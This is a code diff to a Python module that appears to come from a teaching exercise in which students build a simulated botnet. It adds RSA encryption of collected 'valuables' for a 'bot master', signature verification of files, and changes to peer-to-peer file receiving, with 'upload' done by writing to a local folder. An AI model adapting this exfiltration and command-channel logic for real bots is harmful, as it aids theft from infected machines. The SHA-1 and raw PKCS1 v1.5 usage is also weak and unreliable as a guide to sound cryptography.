@@ -1,8 +1,8 @@
 import os
 from Crypto.PublicKey import RSA
-from Crypto.Signature import PKCS1_v1_5
+from Crypto.Signature import PKCS1_v1_5 as sign_rsa
 from Crypto.Hash import SHA
-
+from Crypto.Cipher import PKCS1_v1_5 as encrypt_rsa
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
@@ -18,6 +18,10 @@ def save_valuable(data):
 
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
+    h = SHA.new(data)
+    key = RSA.importKey(open('public.pem').read())
+    cipher = encrypt_rsa.new(key)
+    data = cipher.encrypt(data + h.digest())
     return data
 
 
@@ -26,7 +30,6 @@ def upload_valuables_to_pastebot(fn):
     valuable_data = "\n".join(valuables)
     valuable_data = bytes(valuable_data, "ascii")
     encrypted_master = encrypt_for_master(valuable_data)
-
     # "Upload" it to pastebot (i.e. save in pastebot folder)
     f = open(os.path.join("pastebot.net", fn), "wb")
     f.write(encrypted_master)
@@ -43,7 +46,7 @@ def verify_file(f):
     key = RSA.importKey(open('public.pem').read())
     signature = lines[0]
     message = lines[-1]
-    verifier = PKCS1_v1_5.new(key)
+    verifier = sign_rsa.new(key)
     h = SHA.new(message)
     if verifier.verify(h, signature):
         return True
@@ -75,8 +78,9 @@ def download_from_pastebot(fn):
 
 def p2p_download_file(sconn):
     # Download the file from the other bot
-    fn = str(sconn.recv(), "ascii")
-    f = sconn.recv()
+    fn, flag = sconn.recv()
+    fn = str(fn, 'ascii')
+    f, flag = sconn.recv()
     print("Receiving %s via P2P" % fn)
     process_file(fn, f)
 
